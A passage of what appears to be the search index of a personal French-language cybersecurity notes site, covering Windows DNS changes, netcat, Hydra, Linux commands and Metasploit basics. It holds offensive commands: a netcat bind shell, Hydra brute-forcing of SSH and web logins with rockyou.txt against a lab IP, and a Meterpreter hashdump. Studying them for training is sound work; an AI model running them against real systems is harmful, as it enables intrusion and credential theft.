connues"},{"location":"accueil/","text":"Puit de connaissance en Cyber Bienvenue sur mon petit site statique local pour rassembler toutes les connaissances que je peux avoir en Cyber","title":"Accueil"},{"location":"accueil/#puit-de-connaissance-en-cyber","text":"Bienvenue sur mon petit site statique local pour rassembler toutes les connaissances que je peux avoir en Cyber","title":"Puit de connaissance en Cyber"},{"location":"changer_DNS_windows/","text":"Changement de DNS windows Connaitre son DNS actuel ipconfig /all | findstr \"Server DNS\" Pour trouver le DNS rapidement. Personnellement \u00e7a me met l'IP de ma box ce qui est normal car mes requ\u00eates sont envoy\u00e9es \u00e0 ma box qui renvoie vers le DNS de son choix et \u00e7a \u00e7a me plait pas. En utilisant le cmd Connaitre le nom de l'interface r\u00e9seau pour laquelle on va changer le DNS netsh interface show interface Personnellement c'est Ethernet Du coup on va changer le serveur DNS du protocol IPv4 et IPv6 s\u00e9par\u00e9ment. IPv4 Je commence par IPv4 et je vais mettre le DNS public google : 8.8.8.8 (principal) et 8.8.4.4 (secoure), on va le faire en deux fois : /!\\ il faut lancer le terminal en administrateur netsh interface ipv4 set dnsservers \"Nom interface r\u00e9seau\" static [Adresse IP du serveur DNS primaire] primary netsh interface ipv4 add dnsservers \"Nom interface r\u00e9seau\" [Adresse IP du serveur DNS secondaire] index=2 IPv6 C'est la m\u00eame chose mais avec des adresses IPv6 : 2001:4860:4860::8888 (principale sur le port 8888) et secondaire : 2001:4860:4860::8844 netsh interface ipv6 set dnsservers \"Nom interface r\u00e9seau\" static [Adresse IP du serveur DNS primaire] primary netsh interface ipv6 add dnsservers \"Nom interface r\u00e9seau\" [Adresse IP du serveur DNS secondaire] index=2 On peut v\u00e9rifier que \u00e7a a bien march\u00e9 : Connaitre le DNS d'une interface r\u00e9seau particuli\u00e8re pour un protocole particulier netsh interface Nom_protocole show dnsservers \"Nom interface\" Remettre le DNS de base On peut r\u00e9atribuer le DNS de base qui sera attribu\u00e9 automatiquement via le DHCP netsh interface ipv4 set dnsservers \"Nom de l'interface r\u00e9seau\" dhcp","title":"Changer DNS"},{"location":"changer_DNS_windows/#changement-de-dns-windows","text":"","title":"Changement de DNS windows"},{"location":"changer_DNS_windows/#connaitre-son-dns-actuel","text":"ipconfig /all | findstr \"Server DNS\" Pour trouver le DNS rapidement. Personnellement \u00e7a me met l'IP de ma box ce qui est normal car mes requ\u00eates sont envoy\u00e9es \u00e0 ma box qui renvoie vers le DNS de son choix et \u00e7a \u00e7a me plait pas.","title":"Connaitre son DNS actuel"},{"location":"changer_DNS_windows/#en-utilisant-le-cmd","text":"Connaitre le nom de l'interface r\u00e9seau pour laquelle on va changer le DNS netsh interface show interface Personnellement c'est Ethernet Du coup on va changer le serveur DNS du protocol IPv4 et IPv6 s\u00e9par\u00e9ment.","title":"En utilisant le cmd"},{"location":"changer_DNS_windows/#ipv4","text":"Je commence par IPv4 et je vais mettre le DNS public google : 8.8.8.8 (principal) et 8.8.4.4 (secoure), on va le faire en deux fois : /!\\ il faut lancer le terminal en administrateur netsh interface ipv4 set dnsservers \"Nom interface r\u00e9seau\" static [Adresse IP du serveur DNS primaire] primary netsh interface ipv4 add dnsservers \"Nom interface r\u00e9seau\" [Adresse IP du serveur DNS secondaire] index=2","title":"IPv4"},{"location":"changer_DNS_windows/#ipv6","text":"C'est la m\u00eame chose mais avec des adresses IPv6 : 2001:4860:4860::8888 (principale sur le port 8888) et secondaire : 2001:4860:4860::8844 netsh interface ipv6 set dnsservers \"Nom interface r\u00e9seau\" static [Adresse IP du serveur DNS primaire] primary netsh interface ipv6 add dnsservers \"Nom interface r\u00e9seau\" [Adresse IP du serveur DNS secondaire] index=2 On peut v\u00e9rifier que \u00e7a a bien march\u00e9 :","title":"IPv6"},{"location":"changer_DNS_windows/#connaitre-le-dns-dune-interface-reseau-particuliere-pour-un-protocole-particulier","text":"netsh interface Nom_protocole show dnsservers \"Nom interface\"","title":"Connaitre le DNS d'une interface r\u00e9seau particuli\u00e8re pour un protocole particulier"},{"location":"changer_DNS_windows/#remettre-le-dns-de-base","text":"On peut r\u00e9atribuer le DNS de base qui sera attribu\u00e9 automatiquement via le DHCP netsh interface ipv4 set dnsservers \"Nom de l'interface r\u00e9seau\" dhcp","title":"Remettre le DNS de base"},{"location":"ecoute_ports/","text":"L'\u00e9coute de ports M\u00e9thode NETCAT Pour \u00e9couter un port on peut utiliser la commande : nc -lvp [port] TAG | Description --- | --- -l | Ecouter -v | Verbose -p | Port On peut aussi \u00e9cout\u00e9 un port TCP ou UDP en rajoutant -u ou -t . Exemple : Ecouter un port UDP Pour \u00e9couter un port UDP on peut utiliser la commande : nc -l -u -p [port] M\u00e9thode TCPDUMP Pour \u00e9couter un port on peut utiliser la commande : sudo tcpdump port [port] TAG Description port Filtre port Exemple : Ecouter un port pour une requ\u00eate ICMP Pour \u00e9couter les requ\u00eates ICMP on peut utiliser la commande : sudo tcpdump ip proto \\\\icmp -i tun0 TAG Description ip proto \\\\icmp Filtre ICMP -i Interface Envoyer un fichier Pour envoyer un fichier on peut utiliser la commande : nc [ip] [port] < [fichier] TAG Description < Redirection R\u00e9cup\u00e9rer un fichier Pour r\u00e9cup\u00e9rer un fichier on peut utiliser la commande : nc -lvp [port] > [fichier] TAG Description > Redirection R\u00e9cup\u00e9rer un shell Pour r\u00e9cup\u00e9rer un shell on peut utiliser la commande : nc -lvp [port] -e /bin/bash TAG Description -e Executer","title":"Ecoute de ports"},{"location":"ecoute_ports/#lecoute-de-ports","text":"","title":"L'\u00e9coute de ports"},{"location":"ecoute_ports/#methode-netcat","text":"Pour \u00e9couter un port on peut utiliser la commande : nc -lvp [port] TAG | Description --- | --- -l | Ecouter -v | Verbose -p | Port On peut aussi \u00e9cout\u00e9 un port TCP ou UDP en rajoutant -u ou -t .","title":"M\u00e9thode NETCAT"},{"location":"ecoute_ports/#exemple-ecouter-un-port-udp","text":"Pour \u00e9couter un port UDP on peut utiliser la commande : nc -l -u -p [port]","title":"Exemple : Ecouter un port UDP"},{"location":"ecoute_ports/#methode-tcpdump","text":"Pour \u00e9couter un port on peut utiliser la commande : sudo tcpdump port [port] TAG Description port Filtre port","title":"M\u00e9thode TCPDUMP"},{"location":"ecoute_ports/#exemple-ecouter-un-port-pour-une-requete-icmp","text":"Pour \u00e9couter les requ\u00eates ICMP on peut utiliser la commande : sudo tcpdump ip proto \\\\icmp -i tun0 TAG Description ip proto \\\\icmp Filtre ICMP -i Interface","title":"Exemple : Ecouter un port pour une requ\u00eate ICMP"},{"location":"ecoute_ports/#envoyer-un-fichier","text":"Pour envoyer un fichier on peut utiliser la commande : nc [ip] [port] < [fichier] TAG Description < Redirection","title":"Envoyer un fichier"},{"location":"ecoute_ports/#recuperer-un-fichier","text":"Pour r\u00e9cup\u00e9rer un fichier on peut utiliser la commande : nc -lvp [port] > [fichier] TAG Description > Redirection","title":"R\u00e9cup\u00e9rer un fichier"},{"location":"ecoute_ports/#recuperer-un-shell","text":"Pour r\u00e9cup\u00e9rer un shell on peut utiliser la commande : nc -lvp [port] -e /bin/bash TAG Description -e Executer","title":"R\u00e9cup\u00e9rer un shell"},{"location":"hydra_bases/","text":"Les bases de l'outil Hydra Introduction Hydra est un outil puissant de bruteforce de mots de passe en ligne. Il peut \u00eatre utilis\u00e9 pour attaquer de nombreux protocoles diff\u00e9rents ! Utilisation Syntaxe hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-SuvVd46] [service://server[:PORT][/OPT]] Options TAG Description -l LOGIN ou -L FILE identifiant ou fichier contenant une liste d'identifiants -p PASS ou -P FILE mot de passe ou fichier contenant une liste de mots de passe -C FILE fichier contenant des identifiants et des mots de passe s\u00e9par\u00e9s par des espaces -e nsr arr\u00eater sur le premier succ\u00e8s, afficher les r\u00e9ponses n\u00e9gatives, afficher les r\u00e9ponses positives -o FILE enregistrer les r\u00e9sultats dans le fichier FILE -t TASKS ex\u00e9cuter TASKS nombre de t\u00e2ches simultan\u00e9ment (valeur par d\u00e9faut : 16) -M FILE serveurs multiples (fichier de liste) -T TASKS ex\u00e9cuter TASKS nombre de t\u00e2ches simultan\u00e9ment par serveur (valeur par d\u00e9faut : 16) -w TIME d\u00e9lai d'attente pour les r\u00e9ponses (valeur par d\u00e9faut : 30) -W TIME d\u00e9lai d'attente global pour les r\u00e9ponses (valeur par d\u00e9faut : 30) -f quitter apr\u00e8s la premi\u00e8re r\u00e9ponse positive -s PORT si le service est sur un autre port que le port par d\u00e9faut, sp\u00e9cifiez-le ici -x MIN:MAX:CHARSET ex\u00e9cuter un bruteforce, avec des longueurs de mot de passe de MIN \u00e0 MAX avec le jeu de caract\u00e8res CHARSET -S connexion SSL -u connexion TLS -vV niveau de verbosit\u00e9, -v : afficher les tentatives, -V : afficher les tentatives et les r\u00e9ponses -d afficher les informations de d\u00e9bogage -4 force IPv4 -6 force IPv6 Exemples SSH hydra -l <username> -P /usr/share/wordlists/rockyou.txt <IP> -vV ssh Formulaires Web avec Hydra Nous pouvons \u00e9galement utiliser Hydra pour forcer les formulaires web. Vous devez savoir quel type de requ\u00eate est effectu\u00e9 ; les m\u00e9thodes GET ou POST sont couramment utilis\u00e9es. Vous pouvez utiliser l'onglet r\u00e9seau de votre navigateur (dans les outils de d\u00e9veloppement) pour voir les types de requ\u00eates ou afficher le code source. sudo hydra <username> <wordlist> 10.10.243.64 http-post-form \"<path>:<login_credentials>:<invalid_response>\" Option Description <username> le nom d'utilisateur pour la connexion (formulaire web) <wordlist> liste de mots de passe http-post-form le type de formulaire est POST <path> l'URL de la page de connexion, par exemple, login.php <login_credentials> le nom d'utilisateur et le mot de passe utilis\u00e9s pour se connecter, par exemple, username=^USER^&password=^PASS^ <invalid_response> partie de la r\u00e9ponse en cas d'\u00e9chec de la connexion -V sortie verbeuse pour chaque tentative Exemple pour forcer un formulaire de connexion POST hydra -l <username> -P <wordlist> 10.10.243.64 http-post-form \"/:username=^USER^&password=^PASS^:F=incorrect\" -V La page de connexion n'est que / , c'est-\u00e0-dire l'adresse IP principale. Le username est le champ du formulaire dans lequel le nom d'utilisateur est saisi. Le(s) nom(s) d'utilisateur sp\u00e9cifi\u00e9(s) remplacera(ont) ^USER^ Le password est le champ du formulaire dans lequel le mot de passe est saisi. Enfin, F=incorrect est une cha\u00eene qui appara\u00eet dans la r\u00e9ponse du serveur en cas d'\u00e9chec de la connexion Etape 1 : Trouver le formulaire de connexion Le mieux est d'utiliser burpsuite pour intercepter la requ\u00eate POST. Vous pouvez \u00e9galement utiliser l'onglet r\u00e9seau de votre navigateur (dans les outils de d\u00e9veloppement) pour voir les types de requ\u00eates ou afficher le code source. Avec Burp, ce qui nous int\u00e9resse c'est la t\u00eate qu'a la requ\u00eate username+password. On lance burpsuite On active le proxy et on lance l'intercepter On se connecte au site avec un username et un password bidon On r\u00e9cup\u00e8re sur burpsuite la requ\u00eate envoy\u00e9e On copie la forme de la requ\u00eate exemple username=mon&password=test On envoie la requ\u00eate pour ensuite r\u00e9cup\u00e9rer le messager d'erreur, exemple : Your username or password is incorrect. Etape 2 : Lancer l'attaque avec les infos regroup\u00e9es L'id\u00e9e c'est de faire login: et de recopier la structure de la requ\u00eate de connexion en rempla\u00e7ant l'endroit o\u00f9 il y a l'username et le mdp par ^USER^ et ^PASS^ respectivement. On rajoute ensuite : suivie du message d'erreur \u00e0 la fin. hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.243.64 http-post-form \"/login:username=^USER^&password=^PASS^:Your username or password is incorrect.\" -V","title":"Les bases"},{"location":"hydra_bases/#les-bases-de-loutil-hydra","text":"","title":"Les bases de l'outil Hydra"},{"location":"hydra_bases/#introduction","text":"Hydra est un outil puissant de bruteforce de mots de passe en ligne. Il peut \u00eatre utilis\u00e9 pour attaquer de nombreux protocoles diff\u00e9rents !","title":"Introduction"},{"location":"hydra_bases/#utilisation","text":"","title":"Utilisation"},{"location":"hydra_bases/#syntaxe","text":"hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-SuvVd46] [service://server[:PORT][/OPT]]","title":"Syntaxe"},{"location":"hydra_bases/#options","text":"TAG Description -l LOGIN ou -L FILE identifiant ou fichier contenant une liste d'identifiants -p PASS ou -P FILE mot de passe ou fichier contenant une liste de mots de passe -C FILE fichier contenant des identifiants et des mots de passe s\u00e9par\u00e9s par des espaces -e nsr arr\u00eater sur le premier succ\u00e8s, afficher les r\u00e9ponses n\u00e9gatives, afficher les r\u00e9ponses positives -o FILE enregistrer les r\u00e9sultats dans le fichier FILE -t TASKS ex\u00e9cuter TASKS nombre de t\u00e2ches simultan\u00e9ment (valeur par d\u00e9faut : 16) -M FILE serveurs multiples (fichier de liste) -T TASKS ex\u00e9cuter TASKS nombre de t\u00e2ches simultan\u00e9ment par serveur (valeur par d\u00e9faut : 16) -w TIME d\u00e9lai d'attente pour les r\u00e9ponses (valeur par d\u00e9faut : 30) -W TIME d\u00e9lai d'attente global pour les r\u00e9ponses (valeur par d\u00e9faut : 30) -f quitter apr\u00e8s la premi\u00e8re r\u00e9ponse positive -s PORT si le service est sur un autre port que le port par d\u00e9faut, sp\u00e9cifiez-le ici -x MIN:MAX:CHARSET ex\u00e9cuter un bruteforce, avec des longueurs de mot de passe de MIN \u00e0 MAX avec le jeu de caract\u00e8res CHARSET -S connexion SSL -u connexion TLS -vV niveau de verbosit\u00e9, -v : afficher les tentatives, -V : afficher les tentatives et les r\u00e9ponses -d afficher les informations de d\u00e9bogage -4 force IPv4 -6 force IPv6","title":"Options"},{"location":"hydra_bases/#exemples","text":"","title":"Exemples"},{"location":"hydra_bases/#ssh","text":"hydra -l <username> -P /usr/share/wordlists/rockyou.txt <IP> -vV ssh","title":"SSH"},{"location":"hydra_bases/#formulaires-web-avec-hydra","text":"Nous pouvons \u00e9galement utiliser Hydra pour forcer les formulaires web. Vous devez savoir quel type de requ\u00eate est effectu\u00e9 ; les m\u00e9thodes GET ou POST sont couramment utilis\u00e9es. Vous pouvez utiliser l'onglet r\u00e9seau de votre navigateur (dans les outils de d\u00e9veloppement) pour voir les types de requ\u00eates ou afficher le code source. sudo hydra <username> <wordlist> 10.10.243.64 http-post-form \"<path>:<login_credentials>:<invalid_response>\" Option Description <username> le nom d'utilisateur pour la connexion (formulaire web) <wordlist> liste de mots de passe http-post-form le type de formulaire est POST <path> l'URL de la page de connexion, par exemple, login.php <login_credentials> le nom d'utilisateur et le mot de passe utilis\u00e9s pour se connecter, par exemple, username=^USER^&password=^PASS^ <invalid_response> partie de la r\u00e9ponse en cas d'\u00e9chec de la connexion -V sortie verbeuse pour chaque tentative","title":"Formulaires Web avec Hydra"},{"location":"hydra_bases/#exemple-pour-forcer-un-formulaire-de-connexion-post","text":"hydra -l <username> -P <wordlist> 10.10.243.64 http-post-form \"/:username=^USER^&password=^PASS^:F=incorrect\" -V La page de connexion n'est que / , c'est-\u00e0-dire l'adresse IP principale. Le username est le champ du formulaire dans lequel le nom d'utilisateur est saisi. Le(s) nom(s) d'utilisateur sp\u00e9cifi\u00e9(s) remplacera(ont) ^USER^ Le password est le champ du formulaire dans lequel le mot de passe est saisi. Enfin, F=incorrect est une cha\u00eene qui appara\u00eet dans la r\u00e9ponse du serveur en cas d'\u00e9chec de la connexion","title":"Exemple pour forcer un formulaire de connexion POST"},{"location":"hydra_bases/#etape-1-trouver-le-formulaire-de-connexion","text":"Le mieux est d'utiliser burpsuite pour intercepter la requ\u00eate POST. Vous pouvez \u00e9galement utiliser l'onglet r\u00e9seau de votre navigateur (dans les outils de d\u00e9veloppement) pour voir les types de requ\u00eates ou afficher le code source. Avec Burp, ce qui nous int\u00e9resse c'est la t\u00eate qu'a la requ\u00eate username+password. On lance burpsuite On active le proxy et on lance l'intercepter On se connecte au site avec un username et un password bidon On r\u00e9cup\u00e8re sur burpsuite la requ\u00eate envoy\u00e9e On copie la forme de la requ\u00eate exemple username=mon&password=test On envoie la requ\u00eate pour ensuite r\u00e9cup\u00e9rer le messager d'erreur, exemple : Your username or password is incorrect.","title":"Etape 1 : Trouver le formulaire de connexion"},{"location":"hydra_bases/#etape-2-lancer-lattaque-avec-les-infos-regroupees","text":"L'id\u00e9e c'est de faire login: et de recopier la structure de la requ\u00eate de connexion en rempla\u00e7ant l'endroit o\u00f9 il y a l'username et le mdp par ^USER^ et ^PASS^ respectivement. On rajoute ensuite : suivie du message d'erreur \u00e0 la fin. hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.243.64 http-post-form \"/login:username=^USER^&password=^PASS^:Your username or password is incorrect.\" -V","title":"Etape 2 : Lancer l'attaque avec les infos regroup\u00e9es"},{"location":"linux_commandes_utiles/","text":"Les commandes utiles de Linux Recherche de fichiers Rechercher un fichier find / -name <filename> Rechercher un fichier avec un nom partiel find / -name \"*<filename>*\" Recherche de logs Rechercher un mot dans les logs grep -R \"<word>\" /var/log Recherche de user On peut rechercher un user dans le fichier /etc/passwd : cat /etc/passwd | grep <username> Trouver l'utilisateur actuel whoami Trouver le nom de l'utilisateur du shell On peut faire un echo de la variable $SHELL : echo $SHELL Si \u00e7a ne marche pas, on peut aller regarder dans le fichier /etc/passwd : cat /etc/passwd | grep nom_utilistaur Le retour ressemblera \u00e0 \u00e7a (exemple avec l'utilisateur www-data ): www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin Le nom de l'utilisateur est le premier champ, ici www-data . Ensuite il y a le mot de passe, mais il est chiffr\u00e9 donc on ne peut pas le lire. Ensuite il y a l'ID de l'utilisateur, ici 33 . Ensuite il y a l'ID du groupe de l'utilisateur, ici 33 . Ensuite il y a le nom complet de l'utilisateur, ici www-data . Ensuite il y a le chemin vers le dossier de l'utilisateur, ici /var/www . Enfin il y a le chemin vers le shell de l'utilisateur, ici /usr/sbin/nologin . Trouver la version du syst\u00e8me d'exploitation cat /etc/os-release ou lsb_release -a","title":"Commandes utiles"},{"location":"linux_commandes_utiles/#les-commandes-utiles-de-linux","text":"","title":"Les commandes utiles de Linux"},{"location":"linux_commandes_utiles/#recherche-de-fichiers","text":"","title":"Recherche de fichiers"},{"location":"linux_commandes_utiles/#rechercher-un-fichier","text":"find / -name <filename>","title":"Rechercher un fichier"},{"location":"linux_commandes_utiles/#rechercher-un-fichier-avec-un-nom-partiel","text":"find / -name \"*<filename>*\"","title":"Rechercher un fichier avec un nom partiel"},{"location":"linux_commandes_utiles/#recherche-de-logs","text":"","title":"Recherche de logs"},{"location":"linux_commandes_utiles/#rechercher-un-mot-dans-les-logs","text":"grep -R \"<word>\" /var/log","title":"Rechercher un mot dans les logs"},{"location":"linux_commandes_utiles/#recherche-de-user","text":"On peut rechercher un user dans le fichier /etc/passwd : cat /etc/passwd | grep <username>","title":"Recherche de user"},{"location":"linux_commandes_utiles/#trouver-lutilisateur-actuel","text":"whoami","title":"Trouver l'utilisateur actuel"},{"location":"linux_commandes_utiles/#trouver-le-nom-de-lutilisateur-du-shell","text":"On peut faire un echo de la variable $SHELL : echo $SHELL Si \u00e7a ne marche pas, on peut aller regarder dans le fichier /etc/passwd : cat /etc/passwd | grep nom_utilistaur Le retour ressemblera \u00e0 \u00e7a (exemple avec l'utilisateur www-data ): www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin Le nom de l'utilisateur est le premier champ, ici www-data . Ensuite il y a le mot de passe, mais il est chiffr\u00e9 donc on ne peut pas le lire. Ensuite il y a l'ID de l'utilisateur, ici 33 . Ensuite il y a l'ID du groupe de l'utilisateur, ici 33 . Ensuite il y a le nom complet de l'utilisateur, ici www-data . Ensuite il y a le chemin vers le dossier de l'utilisateur, ici /var/www . Enfin il y a le chemin vers le shell de l'utilisateur, ici /usr/sbin/nologin .","title":"Trouver le nom de l'utilisateur du shell"},{"location":"linux_commandes_utiles/#trouver-la-version-du-systeme-dexploitation","text":"cat /etc/os-release ou lsb_release -a","title":"Trouver la version du syst\u00e8me d'exploitation"},{"location":"metasploit_bases/","text":"Metasploit : les bases Intro fonctionnement Metasploit se lance avec la commande msfconsole . C'est une interface qui permet de lancer des exploits sur une cible. Quand on rentre dans la console metasploit, c'est une console \u00e0 part du terminal classique. Les commandes utiles \u00e0 garder en t\u00eate sont help ma_commande et history qui permet de lister l'historique des commandes effectu\u00e9es. Dans metasploit, il y a des modules que l'on s\u00e9lectionne en utilisant la commande use le/chemin/de/mon/module . Les modules sont un ensemble de code qui va s'ex\u00e9cuter automatiquement. La plupart du temps les modules sont des exploits . Ils permettent d'exploiter une faille mais il y a aussi des modules permettant de rep\u00e9rer des vuln\u00e9rabilit\u00e9s ou autre. Il faut garder en t\u00eate qu'avec metasploit il y a une notion de profondeur. Lorsqu'on utilise un module on est au niveau de ce module uniquement, quand on est dans la payload d'un module et qu'on fait des modifications on est dans la payload pr\u00e9cise uniquement, etc. Pour revenir d'un niveau en arri\u00e8re on peut utiliser la commande : back Utiliser une exploit Rechercher un module Il y a un grand nombre de modules pr\u00e9sents avec metasploit. Il est donc n\u00e9cessaire de faire des recherches au sein de ces modules. Pour cela on peut utiliser la commande : search ce que je veux chercher Il y a plusieurs param\u00e8tres possibles avec la fonction search. Plus d'infos en faisant un help search . Parmis les param\u00e8tres utiles il y a le fait de pouvoir s\u00e9lectionner le rang des r\u00e9sultats. En effet, chaque exploit \u00e0 un rang qui correspond globalement \u00e0 son taux de r\u00e9ussite. On peut aussi s\u00e9lectionner les modules ayant la fonctionnalit\u00e9 \"check\" qui permet de checker si l'exploit est possible sur la cible sans le lancer pour autant. S\u00e9lectionner un module Directement apr\u00e8s une recherche on peut faire un use [num\u00e9ro du module dans la recherche] ce qui vient s\u00e9lectionner le module souhait\u00e9. Ou alors on peut marquer le nom complet du module apr\u00e8s le use. Param\u00e9trer le module Avant de param\u00e9trer le module il vaut mieux comprendre ce qu'il fait et de quels param\u00e8tres il a besoin. Pour \u00e7a on peut faire un : info qui nous donne toutes les infos sur le module. Il y a aussi une liste de param\u00e8tres qu'on peut entrer en faisant : set mon_param\u00e8tre sa_valeur Attention ! le param\u00e8tre sera sauvegard\u00e9 en tant que variable local de ce module. Si on change de module il faudra refaire les param\u00e8tres. Pour faire des param\u00e8tres globaux il faut utiliser : setg mon_param\u00e8tre_global sa_valeur On peut faire un show options pour voir si les param\u00e8tres ont bien \u00e9t\u00e9 mis correctement On peut supprimer un param\u00e8tre local avec la commande unset nom_du_param\u00e8tre . On peut supprimer tous les param\u00e8tres locaux avec unset all . Pour faire de m\u00eame avec les param\u00e8tre globaux : unsetg Trouver des payloads Une fois que l'exploit sera lanc\u00e9, une premi\u00e8re faille sera cr\u00e9\u00e9e et \u00e7a va ouvrir une porte appel\u00e9e session . Suite \u00e0 quoi on peut envoyer des payloads qui sont des morceaux de code qui vont s'ex\u00e9cuter sur la machine cible. Pour trouver des payloads compatibles avec le module utilis\u00e9, on peut faire un : show payloads Lancer l'exploit Avant de lancer l'exploit, si le module le permet, on peut checker si l'exploit est faisable sur la cible avec : check Pour lancer une exploit il suffit de taper la commande exploit ou run . Si on rajoute l'option exploit -z \u00e7a va lancer l'exploit et mettre la session ouverte en arri\u00e8re plan. G\u00e9rer les sessions Une fois l'exploit r\u00e9ussi, cela ouvre une session. On peut continuer sur cette session directement ou la mettre en arri\u00e8re plan avec la commande : background Pour lister les sessions actives en arri\u00e8re plan on peut faire un : sessions Pour int\u00e9ragir avec une session : session -i [num\u00e9ro de la sesssion]","title":"Les bases"},{"location":"metasploit_bases/#metasploit-les-bases","text":"","title":"Metasploit : les bases"},{"location":"metasploit_bases/#intro-fonctionnement","text":"Metasploit se lance avec la commande msfconsole . C'est une interface qui permet de lancer des exploits sur une cible. Quand on rentre dans la console metasploit, c'est une console \u00e0 part du terminal classique. Les commandes utiles \u00e0 garder en t\u00eate sont help ma_commande et history qui permet de lister l'historique des commandes effectu\u00e9es. Dans metasploit, il y a des modules que l'on s\u00e9lectionne en utilisant la commande use le/chemin/de/mon/module . Les modules sont un ensemble de code qui va s'ex\u00e9cuter automatiquement. La plupart du temps les modules sont des exploits . Ils permettent d'exploiter une faille mais il y a aussi des modules permettant de rep\u00e9rer des vuln\u00e9rabilit\u00e9s ou autre. Il faut garder en t\u00eate qu'avec metasploit il y a une notion de profondeur. Lorsqu'on utilise un module on est au niveau de ce module uniquement, quand on est dans la payload d'un module et qu'on fait des modifications on est dans la payload pr\u00e9cise uniquement, etc. Pour revenir d'un niveau en arri\u00e8re on peut utiliser la commande : back","title":"Intro fonctionnement"},{"location":"metasploit_bases/#utiliser-une-exploit","text":"","title":"Utiliser une exploit"},{"location":"metasploit_bases/#rechercher-un-module","text":"Il y a un grand nombre de modules pr\u00e9sents avec metasploit. Il est donc n\u00e9cessaire de faire des recherches au sein de ces modules. Pour cela on peut utiliser la commande : search ce que je veux chercher Il y a plusieurs param\u00e8tres possibles avec la fonction search. Plus d'infos en faisant un help search . Parmis les param\u00e8tres utiles il y a le fait de pouvoir s\u00e9lectionner le rang des r\u00e9sultats. En effet, chaque exploit \u00e0 un rang qui correspond globalement \u00e0 son taux de r\u00e9ussite. On peut aussi s\u00e9lectionner les modules ayant la fonctionnalit\u00e9 \"check\" qui permet de checker si l'exploit est possible sur la cible sans le lancer pour autant.","title":"Rechercher un module"},{"location":"metasploit_bases/#selectionner-un-module","text":"Directement apr\u00e8s une recherche on peut faire un use [num\u00e9ro du module dans la recherche] ce qui vient s\u00e9lectionner le module souhait\u00e9. Ou alors on peut marquer le nom complet du module apr\u00e8s le use.","title":"S\u00e9lectionner un module"},{"location":"metasploit_bases/#parametrer-le-module","text":"Avant de param\u00e9trer le module il vaut mieux comprendre ce qu'il fait et de quels param\u00e8tres il a besoin. Pour \u00e7a on peut faire un : info qui nous donne toutes les infos sur le module. Il y a aussi une liste de param\u00e8tres qu'on peut entrer en faisant : set mon_param\u00e8tre sa_valeur Attention ! le param\u00e8tre sera sauvegard\u00e9 en tant que variable local de ce module. Si on change de module il faudra refaire les param\u00e8tres. Pour faire des param\u00e8tres globaux il faut utiliser : setg mon_param\u00e8tre_global sa_valeur On peut faire un show options pour voir si les param\u00e8tres ont bien \u00e9t\u00e9 mis correctement On peut supprimer un param\u00e8tre local avec la commande unset nom_du_param\u00e8tre . On peut supprimer tous les param\u00e8tres locaux avec unset all . Pour faire de m\u00eame avec les param\u00e8tre globaux : unsetg","title":"Param\u00e9trer le module"},{"location":"metasploit_bases/#trouver-des-payloads","text":"Une fois que l'exploit sera lanc\u00e9, une premi\u00e8re faille sera cr\u00e9\u00e9e et \u00e7a va ouvrir une porte appel\u00e9e session . Suite \u00e0 quoi on peut envoyer des payloads qui sont des morceaux de code qui vont s'ex\u00e9cuter sur la machine cible. Pour trouver des payloads compatibles avec le module utilis\u00e9, on peut faire un : show payloads","title":"Trouver des payloads"},{"location":"metasploit_bases/#lancer-lexploit","text":"Avant de lancer l'exploit, si le module le permet, on peut checker si l'exploit est faisable sur la cible avec : check Pour lancer une exploit il suffit de taper la commande exploit ou run . Si on rajoute l'option exploit -z \u00e7a va lancer l'exploit et mettre la session ouverte en arri\u00e8re plan.","title":"Lancer l'exploit"},{"location":"metasploit_bases/#gerer-les-sessions","text":"Une fois l'exploit r\u00e9ussi, cela ouvre une session. On peut continuer sur cette session directement ou la mettre en arri\u00e8re plan avec la commande : background Pour lister les sessions actives en arri\u00e8re plan on peut faire un : sessions Pour int\u00e9ragir avec une session : session -i [num\u00e9ro de la sesssion]","title":"G\u00e9rer les sessions"},{"location":"metasploit_exploits/","text":"Metasploit : les exploits","title":"Les exploits"},{"location":"metasploit_exploits/#metasploit-les-exploits","text":"","title":"Metasploit : les exploits"},{"location":"metasploit_meterpreter/","text":"Les bases d'une session meterpreter Pour arriver \u00e0 avoir une session meterpreter, il faut d'abord avoir un acc\u00e8s \u00e0 la machine cible. Pour cela, il faut exploiter une faille de s\u00e9curit\u00e9, ou utiliser un mot de passe trouv\u00e9 par bruteforce ou par social engineering. Ensuite, il faut g\u00e9n\u00e9rer une payload avec msfvenom, et l'envoyer sur la machine cible. Enfin, il faut lancer un listener sur la machine attaquante, et attendre que la victime se connecte. Les commandes de base Une fois que la victime s'est connect\u00e9e, on peut utiliser les commandes de base de meterpreter. Le mieux est de passer la session meterpreter en arri\u00e8re plan, pour pouvoir utiliser les commandes de msfconsole en m\u00eame temps. meterpreter > background [*] Backgrounding session 1... msf6 exploit(multi/handler) > Ensuite on peut chercher les modules de post exploitation disponibles. msf6 exploit(multi/handler) > search post/linux Une fois le module trouv\u00e9, on peut retourner dans la session meterpreter, et lancer le module. msf6 exploit(multi/handler) > sessions -i 1 [*] Starting interaction with 1... meterpreter > run post/linux/gather/hashdump","title":"Les post-exploits"},{"location":"metasploit_meterpreter/#les-bases-dune-session-meterpreter","text":"Pour arriver \u00e0 avoir une session meterpreter, il faut d'abord avoir un acc\u00e8s \u00e0 la machine cible. Pour cela, il faut exploiter une faille de s\u00e9curit\u00e9, ou utiliser un mot de passe trouv\u00e9 par bruteforce ou par social engineering. Ensuite, il faut g\u00e9n\u00e9rer une payload avec msfvenom, et l'envoyer sur la machine cible. Enfin, il faut lancer un listener sur la machine attaquante, et attendre que la victime se connecte.","title":"Les bases d'une session meterpreter"},{"location":"metasploit_meterpreter/#les-commandes-de-base","text":"Une fois que la victime s'est connect\u00e9e, on peut utiliser les commandes de base de meterpreter. Le mieux est de passer la session meterpreter en arri\u00e8re plan, pour pouvoir utiliser les commandes de msfconsole en m\u00eame temps. meterpreter > background [*] Backgrounding session 1... msf6 